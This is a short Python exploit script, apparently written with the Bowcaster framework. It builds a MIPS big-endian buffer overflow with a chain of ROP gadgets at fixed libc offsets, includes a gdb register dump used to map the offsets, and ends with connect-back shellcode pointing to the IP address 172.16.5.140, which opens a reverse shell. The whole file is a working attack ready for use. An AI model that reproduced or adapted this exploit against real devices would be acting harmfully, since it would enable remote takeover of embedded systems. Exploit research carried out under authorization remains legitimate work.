#!/usr/bin/env python
from bowcaster.common import BigEndian
from bowcaster.development import OverflowBuffer, RopGadget, OverflowSection
from bowcaster.payloads.mips import ConnectbackPayload
from bowcaster.encoders.mips import MipsXorEncoder

LIBC_BASE_ADDRESS=0x2aadc000

first_rop_gadget = RopGadget(BigEndian,520,0x192c8,
    description="ROP gadget to fill all s registers.",
    base_address=LIBC_BASE_ADDRESS)

'''
(gdb) i r
          zero       at       v0       v1       a0       a1       a2       a3
 R0   00000000 1000a400 00000400 00000001 2ac5b89c 00000001 0000002d 00000000 
            t0       t1       t2       t3       t4       t5       t6       t7
 R8   00000000 80650000 80650000 726f6d20 3137322e 68374268 38426839 31362e35 
            s0       s1       s2       s3       s4       s5       s6       s7
 R16  30417431 41743241 74334174 34417435 41743641 74374174 38417439 41753041 
            t8       t9       k0       k1       gp       sp       s8       ra
 R24  00000000 00000000 7efefeff 00000000 004195d0 7fdee7b0 75314175 32417533 
        status       lo       hi badvaddr    cause       pc
      0000a413 00000000 00000000 32417532 10800008 32417533 
          fcsr      fir  restart
      00000000 00000000 00000000 

s0 572
s1 576
s2 580
s3 584
s4 588
s5 592
s6 596
s7 600
s8 604
ra 608
'''

second_rop_gadget = RopGadget(BigEndian,608,0x17524,
    description="Fill a0 with 2 for call to sleep(), then jump to s0",
    base_address=LIBC_BASE_ADDRESS)

third_rop_gadget = RopGadget(BigEndian,572,0x19ae0,
    description="Call sleep (stored in s4), then jump to s1 after sleep()",
    base_address=LIBC_BASE_ADDRESS)

sleep_rop_gadget = RopGadget(BigEndian,588,0xb29f0,
    description="This is the address of sleep()",
    base_address=LIBC_BASE_ADDRESS)

find_stack_rop_gadget = RopGadget(BigEndian,576,0xc6964,
    description="Fill s2 with $sp+0x18, then call s3",
    base_address=LIBC_BASE_ADDRESS)

call_stack_payload_rop_gadget = RopGadget(BigEndian,584,0x19250,
    description="Call s2 (should be our connectback payload on the stack",
    base_address=LIBC_BASE_ADDRESS)

connectback_payload = ConnectbackPayload('172.16.5.140',BigEndian)
connectback_section = OverflowSection(668,connectback_payload.shellcode,
    description="The connectback payload")

oflow = OverflowBuffer(BigEndian,2048,
    overflow_sections = [first_rop_gadget,
                         second_rop_gadget,
                         third_rop_gadget,
                         sleep_rop_gadget,
                         find_stack_rop_gadget,
                         call_stack_payload_rop_gadget,
                         connectback_section])

print oflow

